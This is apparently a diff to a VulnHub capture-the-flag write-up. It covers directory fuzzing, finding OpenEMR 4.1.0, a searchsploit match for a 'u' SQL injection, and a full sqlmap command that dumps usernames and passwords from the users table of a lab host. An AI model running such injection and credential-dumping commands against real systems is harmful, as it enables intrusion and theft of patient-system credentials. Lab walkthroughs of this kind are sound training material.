@@ -35,15 +35,27 @@ Service Info: OS: Unix
 i begin with port 21 and check anonymous login, but no chance
 
 on port 80 we see nothing intresting too, so i began fuzzing the directories, i tried several wordlists for directory bruteforcing but no chance
+
 finally i used this wordlist `danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-big.txt` and found this :
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d69df255-75e2-4e4a-82a2-4a08b9b5a082)
 
 let's visit this new directory :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/61744c55-fcbe-4ad2-8cb4-b5afc0d24054)
 
+as we can see the version of OpenEMR that is `4.1.0`, we search in searchsploit to find any vulns :
 
+```bash
+root@kali: searchsploit openemr
+OpenEMR 4.1.0 - 'u' SQL Injection | php/webapps/49742.py
+```
 
+on this code we see that there is a vulnerable endpoint and parameter i just copied it and used it in sqlmap :
+
+```bash
+root@kali: sqlmap -u "http://192.168.56.135/openemr/interface/login/validateUser.php?u=" -p 'u' --batch -D openemr -T users -C username,password --dump
+```
 
 
 
